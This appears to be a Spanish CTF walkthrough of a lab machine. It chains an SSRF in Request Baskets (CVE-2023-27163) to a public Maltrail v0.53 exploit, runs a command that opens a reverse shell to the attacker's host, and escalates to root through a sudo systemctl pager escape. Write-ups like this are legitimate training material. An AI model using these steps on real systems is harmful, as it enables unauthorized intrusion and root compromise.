Hacemos el escaneo con nmap:
![[Pasted image 20240110113102.png]]
Accedemos al puerto 55555 por la web y nos encontramos con esto:
![[Pasted image 20240110113141.png]]
Si damos en create, se nos abre esta ventana:
![[Pasted image 20240110113538.png]]
Se crea un basket:
![[Pasted image 20240110113603.png]]
Y nos encontramos con que esta web es vulnerable a un Server-Side Request Forgery:
![[Pasted image 20240110113246.png]]
Y por aquí tenemos una PoC:
```bash
https://github.com/rvizx/CVE-2023-27163
```
Una vez visto esto, investigamos cómo explotar esto:
```bash
https://medium.com/@li_allouche/request-baskets-1-2-1-server-side-request-forgery-cve-2023-27163-2bab94f201f7
```
![[Pasted image 20240110181722.png]]
En la web vamos a establecer la siguiente configuración dentro del panel de ajustes y le cargamos en puerto 80 ya que estaba filtrado dentro del reporte de nmap:
![[Pasted image 20240110114021.png]]
Una vez que hayamos hecho esto, accedemos a nuestro basket y vemos algo de mail track, que en realidad es lo que corre por el puerto 80:
![[Pasted image 20240110114052.png]]![[Pasted image 20240110114100.png]]
Donde tenemos la versión:
![[Pasted image 20240110114125.png]]
Y tenemos forma de explotar vulnerabilidades de este servicio:
```bash
https://github.com/spookier/Maltrail-v0.53-Exploit
```
![[Pasted image 20240110114405.png]]
Nos bajamos el exploit de Python y lo probamos siguiendo las instrucciones:
![[Pasted image 20240110114436.png]]
Y le pasamos la url del basket que habíamos generado:
```bash
python3 exploit.py 10.10.16.6 443 http://10.10.11.224:55555/9e1s83l
```
![[Pasted image 20240110114504.png]]
Y obtenemos la reverse shell:
![[Pasted image 20240110114516.png]]
Y con sudo -l podemos ejecutar el siguiente comando como root:
![[Pasted image 20240110114802.png]]
En este punto simplemente ejecutamos como root el binario y con una exclamación le pasamos una bash:
```bash
sudo /usr/bin/systemctl status trail.service
```
![[Pasted image 20240110115006.png]]